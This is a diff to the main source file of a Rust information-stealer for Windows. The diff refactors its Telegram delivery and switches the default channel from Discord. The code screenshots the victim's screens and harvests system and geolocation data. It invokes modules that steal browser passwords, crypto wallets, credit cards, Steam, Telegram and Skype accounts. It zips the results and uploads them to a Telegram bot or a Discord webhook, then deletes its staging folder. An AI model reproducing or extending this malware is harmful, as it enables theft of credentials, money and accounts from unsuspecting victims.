@@ -1,4 +1,4 @@
-#![windows_subsystem = "windows"] // Hide the Console
+#![windows_subsystem = "console"] // Hide the Console
 
 mod chrome_grabber;
 mod messengers;
@@ -9,26 +9,24 @@ extern crate serde;
 
 use screenshots::*;
 
+use ipgeolocate::{Locator, Service};
 use std::io::{prelude::*, Seek, Write};
+use std::os::windows::fs::OpenOptionsExt;
 use std::{fs::File, iter::Iterator, path::Path};
 use sysinfo::{NetworkExt, ProcessExt, System, SystemExt};
-use tbot::{markup::*, types::input_file::Document, types::parameters::Text as ParseMode, Bot};
 use walkdir::{DirEntry, WalkDir};
-use zip::{result::ZipError, write::FileOptions};
-type ChannelId = tbot::types::chat::Id;
-use ipgeolocate::{Locator, Service};
-use std::os::windows::fs::OpenOptionsExt;
 use winapi::um::winnt::FILE_ATTRIBUTE_HIDDEN;
 use wmi::{COMLibrary, WMIConnection};
+use zip::{result::ZipError, write::FileOptions};
 
 #[allow(dead_code)]
 enum DeliveryMethod {
     TELEGRAM,
     DISCORD,
-    NONE
+    NONE,
 }
 
-const MODE: DeliveryMethod = DeliveryMethod::DISCORD;
+const MODE: DeliveryMethod = DeliveryMethod::TELEGRAM;
 //TG
 const BOT_TOKEN: &str = "";
 const CHANNEL_ID: i64 = -0;
@@ -38,19 +36,15 @@ const DISCORD_WEBHOOK: &str = "";
 
 const MUTEX: bool = false;
 
-
-static mut PASSWORDS: i64 = 0;
-static mut WALLETS: i64 = 0;
-static mut FILES: i64 = 0;
-static mut CREDIT_CARDS: i64 = 0;
+static mut PASSWORDS: usize = 0;
+static mut WALLETS: usize = 0;
+static mut FILES: usize = 0;
+static mut CREDIT_CARDS: usize = 0;
 
 #[tokio::main]
 async fn main() {
     let app_data = std::env::var("LOCALAPPDATA").ok().unwrap();
 
-    
-    
-    
     let string_path: &str = &format!("{}\\logsxc\\", app_data);
     let mutex_file = format!("{}\\dimp.sts", app_data);
 
@@ -67,13 +61,11 @@ async fn main() {
         .attributes(FILE_ATTRIBUTE_HIDDEN)
         .open(mutex_file);
 
-    std::fs::create_dir(string_path); 
-    
-    let bot = Bot::new(BOT_TOKEN.to_string());
+    std::fs::create_dir(string_path);
+
     let language = format!("{:?}", whoami::lang().collect::<Vec<String>>());
     let mut sys = System::new_all();
     sys.refresh_all();
-
 
     let city = match Locator::get(&my_internet_ip::get().unwrap().to_string(), Service::IpApi).await
     {
@@ -83,7 +75,7 @@ async fn main() {
         ),
         Err(error) => format!("Error: {}", error),
     };
-    
+
     let mut i = 1;
     for screen in Screen::all() {
         let image = screen.capture().unwrap();
@@ -91,7 +83,6 @@ async fn main() {
         std::fs::write(format!("{}\\screen-{}.png", string_path, i), &buffer).unwrap(); // make it with i because the library is stupid and cant do it on its own.
         i += 1;
     }
-   
 
     let mut sysinfo = vec![];
     sysinfo.push(format!("Username: {}", whoami::username()));
@@ -107,19 +98,19 @@ async fn main() {
         my_internet_ip::get().unwrap().to_string()
     ));
     sysinfo.push(city);
-    
+
     let hardware = get_hardware();
     if hardware.is_ok() {
         sysinfo.push(format!("{}", hardware.unwrap()));
     }
-    
+
     std::fs::File::create(format!("{}\\info.txt", string_path))
-    .unwrap()
-    .write_all(sysinfo.join("\n").as_bytes())
-    .unwrap();
-    
+        .unwrap()
+        .write_all(sysinfo.join("").as_bytes())
+        .unwrap();
+
     let mut system_info = vec![];
-    
+
     system_info.push("=> networks:".to_string());
     for (interface_name, data) in sys.networks() {
         let output = format!(
@@ -137,7 +128,7 @@ async fn main() {
     system_info.push(format!("total swap  : {} KB", sys.total_swap()));
     system_info.push(format!("used swap   : {} KB", sys.used_swap()));
     system_info.push(format!("NB CPUs: {}", sys.cpus().len()));
-    
+
     system_info.push("=> Processes:".to_string());
     system_info.push("=> PID, Name".to_string());
     for (pid, process) in sys.processes() {
@@ -147,12 +138,12 @@ async fn main() {
         .unwrap()
         .write_all(system_info.join("\n").as_bytes())
         .unwrap();
-        
+
     //TODO Make A Method in each Package.
     chrome_grabber::main::chrome_main();
     wallet_grabber::wallets::grab_cold_wallets();
     wallet_grabber::wallets::steal_browser_wallets();
-    
+
     other_grabber::sensitive_data::grab_data();
     other_grabber::steam::steal_steam_account();
     other_grabber::telegram::steal_telegram();
@@ -164,42 +155,41 @@ async fn main() {
     messengers::skype::steal_skype();
 
     unsafe {
-        let msg_edit = bold((
-            format!(
-                "**New Log From ({} / {} )**\n",
-                my_internet_ip::get().unwrap().to_string(),
-                whoami::lang().collect::<Vec<String>>().first().unwrap()
-            ),
-            format!("User: {}\n", whoami::username()),
-            format!("Installed Languages: {} \n", language),
-            format!(
-                "Operating System: {} {}\n",
-                sys.name().unwrap(),
-                sys.os_version().unwrap()
-            ),
-            format!(
-                "Used/Installed RAM: {} / {} GB \n",
-                sys.used_memory() / 1024 / 1024,
-                sys.total_memory() / 1024 / 1024
-            ),
-            format!("Cores available: {} \n", sys.cpus().len()),
-            match PASSWORDS > 1 {
-                true => format!("Passwords: ✅ {}\n", PASSWORDS),
-                false => format!("Passwords: ❌\n"),
-            },
-            match WALLETS > 1 {
-                true => format!("Wallets: ✅ {}\n", WALLETS),
-                false => format!("Wallets: ❌\n"),
-            },
-            match FILES > 1 {
-                true => format!("Files: ✅ {}\n", FILES),
-                false => format!("Files: ❌\n"),
-            },
-            match CREDIT_CARDS > 1 {
-                true => format!("Credit Cards: ✅ {}\n", CREDIT_CARDS),
-                false => format!("Credit Cards: ❌\n"),
-            },
+        let mut msg_edit = vec![];
+        msg_edit.push(format!(
+            "**New Log From ({} / {} )**\n",
+            my_internet_ip::get().unwrap().to_string(),
+            whoami::lang().collect::<Vec<String>>().first().unwrap()
         ));
+        msg_edit.push(format!("User: {}\n", whoami::username()));
+        msg_edit.push(format!("Installed Languages: {} \n", language));
+        msg_edit.push(format!(
+            "Operating System: {} {}\n",
+            sys.name().unwrap(),
+            sys.os_version().unwrap()
+        ));
+        msg_edit.push(format!(
+            "Used/Installed RAM: {} / {} GB \n",
+            sys.used_memory() / 1024 / 1024,
+            sys.total_memory() / 1024 / 1024
+        ));
+        msg_edit.push(format!("Cores available: {} \n", sys.cpus().len()));
+        msg_edit.push(match PASSWORDS > 0 {
+            true => format!("Passwords: ✅ {}\n", PASSWORDS),
+            false => format!("Passwords: ❌\n"),
+        });
+        msg_edit.push(match WALLETS > 0 {
+            true => format!("Wallets: ✅ {}\n", WALLETS),
+            false => format!("Wallets: ❌\n"),
+        });
+        msg_edit.push(match FILES > 0 {
+            true => format!("Files: ✅ {}\n", FILES),
+            false => format!("Files: ❌\n"),
+        });
+        msg_edit.push(match CREDIT_CARDS > 0 {
+            true => format!("Credit Cards: ✅ {}\n", CREDIT_CARDS),
+            false => format!("Credit Cards: ❌\n"),
+        });
 
         zip_file(
             string_path,
@@ -207,64 +197,59 @@ async fn main() {
             zip::CompressionMethod::Deflated,
         )
         .unwrap();
-        let mut log_accounts =
-            std::fs::File::open(format!("{}\\out.zip", std::env::var("TEMP").unwrap())).unwrap();
-
-        let mut log_buffer = Vec::new();
-        log_accounts.read_to_end(&mut log_buffer).unwrap();
-
 
         if matches!(MODE, DeliveryMethod::TELEGRAM) {
-        let _data_document: Document = Document::with_bytes("out.zip", &log_buffer);
+            use frankenstein::SendDocumentParams;
 
-   
-        let _call_result = bot
-            .send_document(
-                ChannelId::from(CHANNEL_ID),
-                _data_document.caption(ParseMode::with_markdown_v2(
-                    &markdown_v2(msg_edit).to_string(),
-                )),
-            )
-            .call()
-            .await;
+            let file =
+                std::path::PathBuf::from(format!("{}\\out.zip", std::env::var("TEMP").unwrap()));
 
-        if let Err(_err) = _call_result {
-            bot
-            .send_document(
-                ChannelId::from(CHANNEL_ID),
-                _data_document.caption(ParseMode::with_markdown_v2(
-                    &markdown_v2(bold(format!("Error while Sending log\n: {}", _err))).to_string(),
-                )),
-            )
-            .call()
-            .await.unwrap();
+            let params = SendDocumentParams::builder()
+                .chat_id(CHANNEL_ID)
+                .document(file)
+                .caption(msg_edit.join(""))
+                .build();
+
+            use frankenstein::Api;
+            use frankenstein::TelegramApi;
+            let api = Api::new(BOT_TOKEN);
+
+            api.send_document(&params).unwrap();
+        } else if matches!(MODE, DeliveryMethod::DISCORD) {
+            use serenity::http::Http;
+            use serenity::model::prelude::AttachmentType;
+            use serenity::model::prelude::Embed;
+
+            let http = Http::new("");
+            let webhook = http.get_webhook_from_url(DISCORD_WEBHOOK).await.unwrap();
+
+            let embed = Embed::fake(|e| {
+                e.title("Log Info")
+                    .description(msg_edit.join("\n").to_string())
+            });
+
+            let log_accounts =
+                tokio::fs::File::open(format!("{}\\out.zip", std::env::var("TEMP").unwrap()))
+                    .await
+                    .unwrap();
+
+            webhook
+                .execute(&http, false, |w| {
+                    w.content(format!("New log from {}", whoami::username()))
+                        .username(whoami::username())
+                        .embeds(vec![embed])
+                        .add_file(AttachmentType::File {
+                            file: &log_accounts,
+                            filename: "data.zip".to_string(),
+                        })
+                })
+                .await
+                .unwrap()
+                .unwrap();
+            drop(log_accounts);
+        } else {
+            std::process::exit(-1); // No Delivery
         }
-
-    }else if matches!(MODE, DeliveryMethod::DISCORD) {
-        use serenity::http::Http;
-        use serenity::model::prelude::Embed;
-        use serenity::model::prelude::AttachmentType;
-
-        let http = Http::new("");
-        let  webhook = http.get_webhook_from_url(DISCORD_WEBHOOK).await.unwrap();
-
-      let embed = Embed::fake(|e| {
-        e.title("Log Info")
-            .description(
-                    &markdown_v2(msg_edit).to_string()
-            )
-    });
-   
-    let  log_accounts =
-    tokio::fs::File::open(format!("{}\\out.zip", std::env::var("TEMP").unwrap())).await.unwrap();
-
-
-        webhook
-            .execute(&http, false, |w| w.content(format!("New log from {}", whoami::username())).username(whoami::username()).embeds(vec![embed]).add_file(AttachmentType::File { file: &log_accounts, filename: "data.zip".to_string() })).await.unwrap().unwrap();
-        drop(log_accounts);
-    }else {
-        std::process::exit(-1); // No Delivery
-    }
 
         std::fs::remove_dir_all(string_path).unwrap();
         std::fs::remove_file(format!("{}\\sensfiles.zip", app_data)).unwrap();
